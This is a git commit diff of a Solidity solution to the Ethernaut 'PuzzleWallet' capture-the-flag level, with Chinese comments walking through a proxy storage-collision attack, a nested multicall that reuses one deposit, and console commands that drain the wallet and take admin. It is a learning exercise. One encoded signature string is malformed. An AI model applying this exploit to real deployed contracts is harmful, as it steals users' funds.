685a24174b1436138c2f97082e616e06f5180092
wtno <920093991@qq.com>
2023-03-02 17:14:10 +0800

    24.PuzzleWallet

--- ethernaut/24_PuzzleWallet.sol
+++ ethernaut/24_PuzzleWallet.sol
@@ -10,24 +10,28 @@ import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4
  * 1.PuzzleProxy是代理合约，特点是通过call等方法调用PuzzleProxy中不存在的函数时，PuzzleProxy会delegatecall里面存放的的implementation，在本题也就是PuzzleWallet
  * 2.利用上述的特点，可以修改PuzzleProxy自身的变量，但是通过PuzzleProxy来调用PuzzleWallet中的方法时，PuzzleWallet对应位置的值会变成PuzzleProxy的
  * 3.PuzzleProxy中的pendingAdmin、admin对应PuzzleWallet中的owner和maxBalance
- * 4.想要调用setMaxBalance修改admin需要在白名单中，要求require(msg.sender == owner),因此需要先通过修改pendingAdmin来修改owner
- * 5.在白名单后可以调用setMaxBalance，发现要求require(address(this).balance == 0),需要消耗完所有余额
- * 6.
- * 7.
- * 8.
- * 9.
+ * 4.想要调用setMaxBalance修改admin需要在白名单中，要求require(msg.sender == owner),因此需要先通过修改pendingAdmin来修改owner(步骤1)
+ * 5.在白名单后(步骤2)可以调用setMaxBalance，发现要求require(address(this).balance == 0),需要消耗完所有余额，而唯一一个转账的函数是execute
+ * 6.执行execute要求require(balances[msg.sender] >= value),需要先执行deposit,然而execute中的逻辑只能支付自己账户里的余额，代理合约里的余额依旧无法清零
+ * 7.从上一点可以看出要求balances[msg.sender] == 合约余额+用户余额，需要使用multicall(步骤3)
+ * 8.在上一点后，合约余额为0.002，balances[msg.sender]为2000000000000000，执行步骤4取款
+ * 9.现在可以直接设置maxBalance了，执行步骤5
  */
 contract PuzzleProxy is UpgradeableProxy {
     address public pendingAdmin;
     address public admin; // 有权更新智能合约的逻辑
 
-    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
+    constructor(
+        address _admin,
+        address _implementation,
+        bytes memory _initData
+    ) UpgradeableProxy(_implementation, _initData) {
         admin = _admin;
     }
 
-    modifier onlyAdmin {
-      require(msg.sender == admin, "Caller is not the admin");
-      _;
+    modifier onlyAdmin() {
+        require(msg.sender == admin, "Caller is not the admin");
+        _;
     }
 
     function proposeNewAdmin(address _newAdmin) external {
@@ -35,7 +39,10 @@ contract PuzzleProxy is UpgradeableProxy {
     }
 
     function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
-        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+        require(
+            pendingAdmin == _expectedAdmin,
+            "Expected new admin by the current admin is not the pending admin"
+        );
         admin = pendingAdmin;
     }
 
@@ -56,15 +63,15 @@ contract PuzzleWallet {
         owner = msg.sender;
     }
 
-    modifier onlyWhitelisted {
+    modifier onlyWhitelisted() {
         require(whitelisted[msg.sender], "Not whitelisted");
         _;
     }
 
     // maxBalance为0后重设
     function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
-      require(address(this).balance == 0, "Contract balance is not 0");
-      maxBalance = _maxBalance;
+        require(address(this).balance == 0, "Contract balance is not 0");
+        maxBalance = _maxBalance;
     }
 
     // 添加白名单
@@ -76,15 +83,19 @@ contract PuzzleWallet {
     // 存款
     function deposit() external payable onlyWhitelisted {
         // 要求当前合约余额小于等于maxBalance
-      require(address(this).balance <= maxBalance, "Max balance reached");
-      balances[msg.sender] += msg.value;
+        require(address(this).balance <= maxBalance, "Max balance reached");
+        balances[msg.sender] += msg.value;
     }
 
     // 支付一笔费用，用于call to合约
-    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+    function execute(
+        address to,
+        uint256 value,
+        bytes calldata data
+    ) external payable onlyWhitelisted {
         require(balances[msg.sender] >= value, "Insufficient balance");
         balances[msg.sender] -= value;
-        (bool success, ) = to.call{ value: value }(data);
+        (bool success, ) = to.call{value: value}(data);
         require(success, "Execution failed");
     }
 
@@ -116,10 +127,34 @@ contract Attack {
      * 因为PuzzleProxy没有这个方法，因此实际上是delegatecall了proxy中的implementation(PuzzleWallet)
      * 所以owner()执行的是PuzzleWallet的逻辑，返回的是PuzzleProxy中的pendingAdmin值，也就是player
      */
-    function modifyOwner(PuzzleProxy proxy) public view {
+    function modifyOwner(PuzzleProxy proxy) public view returns(bytes memory) {
         bytes memory data = abi.encodeWithSignature("proposeNewAdmin(address)", msg.sender);
-        proxy.call(data);
+        return data;
     }
     // 2.contract.addToWhitelist(player)
-    // 3.
+
+    // 3.想要通过multicall多次调用deposit需要绕开只能调用一次的限制，可以在multicall里再调用一次multicall
+    function multiDeposit() public pure returns(bytes[] memory){
+        // 调用deposit
+        bytes memory data1 = abi.encodeWithSignature("deposit()");
+        // 通过multicall调用deposit
+        bytes[] memory bytesArray = new bytes[](1);
+        bytesArray[0] = data1;
+        bytes memory data2 = abi.encodeWithSignature("multicall(bytes[])", bytesArray);
+
+        // 得到data1和data2后可以直接去网页用如下代码调用
+        // contract.multicall([data1, data2], {value: toWei('0.001')})
+
+        // 如果想在remix调用，需要再计算一次，然后在PuzzleProxy合约中Transact
+        bytes[] memory bytesArray2 = new bytes[](2);
+        bytesArray2[0] = data1;
+        bytesArray2[1] = data2;
+        bytes memory result = abi.encodeWithSignature("multicall(bytes[]", bytesArray2);
+
+        return bytesArray2;
+    }
+
+    // 4.在PuzzleProxy合约中执行execute取款：await contract.execute(player,toWei('0.002'),0x0)
+
+    // 5.此时余额已清零，直接设定maxBalance：await contract.setMaxBalance(player)
 }
